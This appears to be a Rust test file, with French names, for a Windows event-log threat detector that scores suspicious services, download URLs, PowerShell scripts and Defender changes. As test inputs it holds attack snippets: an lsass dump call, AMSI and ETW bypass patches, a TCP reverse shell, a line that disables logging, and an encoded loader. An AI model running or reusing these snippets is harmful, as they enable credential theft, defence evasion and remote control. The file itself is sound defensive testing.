        (
            "Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\x -name FailureCommand -value 'C:\\x.exe'",
            Some("service"),
        ),
        (
            "Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Services\\x | Select ImagePath",
            None,
        ),
        (
            "$p = Get-Process lsass; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting'); $m = $WERNativeMethods.GetMethod('MiniDumpWriteDump')",
            Some("lsass"),
        ),
        (
            "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sI')))",
            Some("encode"),
        ),
    ];
    for (texte, attendu) in cas {
        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
    }
    assert_eq!(
        service_suspect("PSEXESVC", r"%SystemRoot%\PSEXESVC.exe").map(|x| x.0),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        service_suspect("bad-task", "virusé.exe").map(|x| x.0),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        service_suspect("remotesvc", "calc.exe").map(|x| x.0),
        Some(Gravite::Alerte)
    );
}

/// Sous Wine (aucun journal) comme sur un Windows qui refuse : chaque règle dit pourquoi elle n'a rien vérifié,
/// aucune n'est « saine ».
#[cfg(windows)]
#[test]
fn ordinateur_vivant_sans_journaux_jamais_sain() {
    let fin = std::time::Instant::now() + std::time::Duration::from_secs(30);
    let a = resultat::analyser_vivant(&Options::default(), fin);
    assert_eq!(a.etats.len(), JOURNAUX.len());
    if a.etats.iter().any(|e| matches!(e.lecture, Lecture::Lu(_))) {
        return crate::essais::saute("des journaux se lisent ici : pas un Windows sans journaux");
    }
    for j in &a.jugements {
        assert!(!j.verifie() || j.sans_objet, "{} : {:?}", j.regle.id, j.manques);
    }
    let r = resultat::resultat(&a, (Utc::now(), std::time::Instant::now()), &|_| false);
    assert_eq!(r.verdict(), "non-verifie");
}

// ---------------------------------------------------------------------------------------------------------------
// Après les relectures
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn journaux_vides_muets_ou_audit_reduit() {
    // Security et System lus mais vides : non vérifiées, et sans ouverture de session, l'audit n'est pas prouvé.
    let js = juger_nu(&[], &tout_lu(), options());
    let mdp = regle(&js, "EVT-MDP-001");
    assert!(
        mdp.manques.contains(&Manque::Vide("Security".into())),
        "{:?}",
        mdp.manques
    );
    assert!(mdp.manques.iter().any(|m| matches!(m, Manque::NonAudite { .. })));
    // Security se tait trois jours avant System.
    let muet = [
        sec(4624, 0, &[("LogonType", "5")]),
        ev("System", SCM, 7036, 3 * 86_400, &[]),
    ];
    let js = juger_nu(&muet, &tout_lu(), options());
    assert!(
        regle(&js, "EVT-ADM-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::Muet { journal, .. } if journal == "Security"))
    );
    assert!(
        !regle(&js, "EVT-SRV-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::Muet { .. }))
    );
    // L'audit des ouvertures de session réduit par un 4719 : les règles qui en dépendent ne sont plus vérifiées.
    let reduit = sec(
        4719,
        10,
        &[
            ("SubcategoryGuid", "{0CCE9215-69AE-11D9-BED3-505054503030}"),
            ("AuditPolicyChanges", "%%8448, %%8450"),
        ],
    );
    let js = juger(&[reduit]);
    for id in ["EVT-MDP-001", "EVT-RDP-001", "EVT-IDE-001"] {
        assert!(
            regle(&js, id)
                .manques
                .iter()
                .any(|m| matches!(m, Manque::AuditReduit { .. })),
            "{id}"
        );
    }
    assert!(regle(&js, "EVT-ADM-001").verifie());
}

#[test]
fn un_arret_n_excuse_que_ce_qu_il_peut() {
    let etats = avec_suite(suite(
        vec![
            trou(100, 199, Nature::Absents, 1000, 1100),
            trou(300, 5000, Nature::Absents, 5000, 5600),
        ],
        0,
    ));
    let mut abime = ev("System", "EventLog", 6008, 1050, &[]);
    abime.verifie = false;
    let grand = ev("System", "EventLog", 6008, 5500, &[]);
    let js = juger_avec(&[abime, grand], &etats, options());
    // Un arrêt d'un morceau abîmé n'excuse rien ; un vrai arrêt n'excuse pas 4 701 enregistrements.
    assert!(
        trouvailles(&js, "EVT-EFF-001")
            .iter()
            .all(|t| t.gravite == Gravite::Alerte)
    );
}

#[test]
fn a_la_borne_les_plus_graves_restent() {
    let bornes = BornesMoteur {
        trouvailles: 5,
        ..BornesMoteur::default()
    };
    let mut evs: Vec<EvenementWindows> = (0..20)
        .map(|i| sec(4720, i, &[("TargetUserName", &format!("c{i}"))]))
        .collect();
    evs.push(sec(4720, 100, &[("TargetUserName", "cache$")]));
    for ordre in [evs.clone(), evs.into_iter().rev().collect()] {
        let mut m = Moteur::nouveau(REGLES, options(), bornes.clone());
        for e in &ordre {
            m.recevoir(e);
        }
        let js = m.conclure(&tout_lu());
        let adm = regle(&js, "EVT-ADM-001");
        assert_eq!(adm.trouvailles.len(), 5);
        assert_eq!(adm.trouvailles[0].gravite, Gravite::Critique);
        assert_eq!((adm.au_dela, adm.au_dela_pire), (16, Some(Gravite::Info)));
    }
}

#[test]
fn une_critique_ne_se_declare_jamais_normale() {
    let mut evs: Vec<EvenementWindows> = (0..10).map(|i| echec(i * 30, "alice", "-", "3")).collect();
    evs.push(reussite(400, "alice", "-", "3"));
    let a = analyse(juger(&evs));
    let tout = |_: &str| true;
    let r = resultat::resultat(&a, (Utc::now(), std::time::Instant::now()), &tout);
    assert!(
        r.constats
            .iter()
            .any(|c| c.regle == "EVT-MDP-001" && c.niveau == Some(crate::risk::Niveau::Critique))
    );
}

#[test]
fn un_journal_meme_dans_une_archive_n_est_pas_le_journal() {
    let mut etats: Vec<EtatJournal> = tout_lu().into_iter().filter(|e| e.nom != "Security").collect();
    let mut melange = etat("Security", Lecture::Lu(Vec::new()), None);
    melange.principal = false;
    etats.push(melange);
    let js = juger_avec(&[], &etats, options());
    assert!(
        regle(&js, "EVT-ADM-001")
            .manques
            .contains(&Manque::Absent("Security".into()))
    );
}

#[test]
fn services_apres_relecture() {
    let g = |nom: &str, c: &str| service_suspect(nom, c).map(|x| x.0);
    // L'exception de Defender ancrée : le programme doit être dans son dossier.
    assert_eq!(
        g(
            "MpKslx",
            r"C:\Users\Public\evil.exe C:\ProgramData\Microsoft\Windows Defender\Definition Updates\"
        ),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        g(
            "MpKsl1a2b",
            r"\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{X}\MpKslDrv.sys"
        ),
        None
    );
    assert_eq!(g("x", r"\\?\UNC\hote\p\x.exe"), Some(Gravite::Alerte));
    assert_eq!(g("x", r"\??\UNC\hote\p\x.exe"), Some(Gravite::Alerte));
    // Impacket et Metasploit : un nom au hasard à la racine de Windows.
    assert_eq!(g("WQxv", r"C:\Windows\aBcDeFgH.exe"), Some(Gravite::Alerte));
    assert_eq!(g("x", r"%SYSTEMROOT%\qwerty.exe"), Some(Gravite::Alerte));
    // Sysmon s'installe là, de Microsoft (vu dans un échantillon public).
    assert_eq!(g("Sysmon64", r"C:\Windows\Sysmon64.exe"), None);
    assert_eq!(g("SysmonDrv", r"C:\Windows\SysmonDrv.sys"), None);
    // Un pilote d'outil de matériel en dossier temporaire : à savoir, et un objet qui tient d'une version à l'autre.
    assert_eq!(
        g("cpuz154", r"\??\C:\Windows\TEMP\cpuz154\cpuz154_x64.sys"),
        Some(Gravite::Info)
    );
    assert_eq!(g("x", r"C:\Program Files\Riot Vanguard\vgk.sys"), Some(Gravite::Info));
    assert_eq!(
        g("x", r#""C:\Program Files\nodejs\node.exe" server.js"#),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        g("x", r#""C:\Program Files\PowerShell Universal\Universal.Server.exe""#),
        None
    );
    let cpuz = |v: &str| {
        let e = ev(
            "System",
            SCM,
            7045,
            0,
            &[
                ("ServiceName", v),
                ("ImagePath", &format!(r"\??\C:\Windows\TEMP\{v}\{v}_x64.sys")),
            ],
        );
        trouvailles(&juger(&[e]), "EVT-SRV-001")[0].objet.clone()
    };
    assert_eq!(cpuz("cpuz154"), cpuz("cpuz160"));
}

#[test]
fn bits_et_scripts_apres_relecture() {
    assert_eq!(
        adresse_inhabituelle("https://drive.google.com/uc?export=download&id=1").map(|x| x.1),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        adresse_inhabituelle("https://onedrive.live.com/download?cid=1").map(|x| x.1),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        adresse_inhabituelle("http://wsus01:8530/Content/x.cab").map(|x| x.1),
        Some(Gravite::Info)
    );
    assert_eq!(
        adresse_inhabituelle("http://wsus.contoso.local/x").map(|x| x.1),
        Some(Gravite::Info)
    );
    assert_eq!(adresse_inhabituelle("https://aka.ms/x"), None);
    let cas = [
        ("# Download data from the API\nGet-Date", None),
        ("Remove-Item x -Confirm:$false; Invoke-Expression $commande", None),
        (
            "$a = [Ref].Assembly.GetType('System.Management.Automation.' + $n); $f = $a.GetField($c,'NonPublic,Static'); $f.SetValue($null,$true)",
            Some("amsi"),
        ),
        (
            "$k=[Kernel32]::GetProcAddress($h,'AmsiScan'+'Buffer'); [Kernel32]::VirtualProtect($k,5,0x40,[ref]0)",
            Some("amsi"),
        ),
        (
            "$a=[W]::GetProcAddress($h,'EtwEventWrite'); [W]::VirtualProtect($a,1,0x40,[ref]$o)",
            Some("memoire"),
        ),
        (
            "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',443);$s=$c.GetStream();while(1){$d=(iex $t 2>&1)}",
            Some("outil"),
        ),
        (
            "Set-ItemProperty HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0",
            Some("desarme"),
        ),
        (
            "[IO.Compression.GZipStream]::new([IO.MemoryStream][Convert]::FromBase64String($b), 'Decompress')",
            None,
        ),
    ];
    for (texte, attendu) in cas {
        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
    }
    // PowerShell 2 lancé exprès : des données sans nom, telles que les écrit le journal « Windows PowerShell ».
    let mut v2 = ev(
        "Windows PowerShell",
        "PowerShell",
        400,
        0,
        &[("", "Available"), ("", "None")],
    );
    v2.champs.push((String::new(), "\tNewEngineState=Available\r\n\tHostVersion=2.0\r\n\tEngineVersion=2.0\r\n\tHostApplication=powershell -version 2\r\n".into()));
    let v5 = ev(
        "Windows PowerShell",
        "PowerShell",
        400,
        1,
        &[("", "\tEngineVersion=5.1.19041.1\r\n")],
    );
    let js = juger(&[v2, v5]);
    let t = trouvailles(&js, "EVT-PSH-001");
    assert_eq!(t.len(), 1);
    assert!(t[0].details.iter().any(|(_, v)| v.contains("-version 2")));
}

#[test]
fn defender_et_comptes_apres_relecture() {
    let echec_d = ev(DEF, DEFP, 1119, 0, &[("Threat Name", "Trojan:Win32/Exemple")]);
    let un = ev(
        DEF,
        DEFP,
        5007,
        1,
        &[(
            "New Value",
            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection = 1",
        )],
    );
    let zero = ev(
        DEF,
        DEFP,
        5007,
        2,
        &[(
            "New Value",
            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection = 0x0",
        )],
    );
    let falsification = ev(DEF, DEFP, 5013, 3, &[("Value", "DisableRealtimeMonitoring")]);
    let mut g = gravites(&juger(&[echec_d, un, zero, falsification]), "EVT-DEF-001");
    g.sort();
    assert_eq!(g, [Gravite::Alerte, Gravite::Alerte, Gravite::Critique]);
    // Trente échecs sur vingt heures, sous tout seuil de verrouillage ; un compte verrouillé.
    let lents: Vec<EvenementWindows> = (0..30).map(|i| echec(i * 2400, "alice", "-", "3")).collect();
    let js = juger(&lents);
    let t = trouvailles(&js, "EVT-MDP-001");
    assert!(t.iter().any(|t| t.volet == 4 && t.objet == "lent:alice"), "{t:#?}");
    // Une rafale rapide n'est pas dite une seconde fois en lente.
    let vite: Vec<EvenementWindows> = (0..40).map(|i| echec(i * 20, "bob", "-", "3")).collect();
    let js = juger(&vite);
    assert!(!trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.objet == "lent:bob"));
    let verrou = sec(4740, 0, &[("TargetUserName", "alice"), ("TargetDomainName", "POSTE")]);
    assert_eq!(gravites(&juger(&[verrou]), "EVT-MDP-001"), [Gravite::Alerte]);
    // Un programme d'un profil (Teams) : à savoir ; un faux svchost dans un profil : se fait passer pour Windows.
    let par = |p: &str| sec(4648, 0, &[("ProcessName", p), ("TargetUserName", "a")]);
    let js = juger(&[
        par(r"C:\Users\bob\AppData\Local\Microsoft\Teams\current\Teams.exe"),
        par(r"C:\Users\bob\svchost.exe"),
    ]);
    let mut g = gravites(&js, "EVT-IDE-001");
    g.sort();
    assert_eq!(g, [Gravite::Info, Gravite::Alerte]);
}
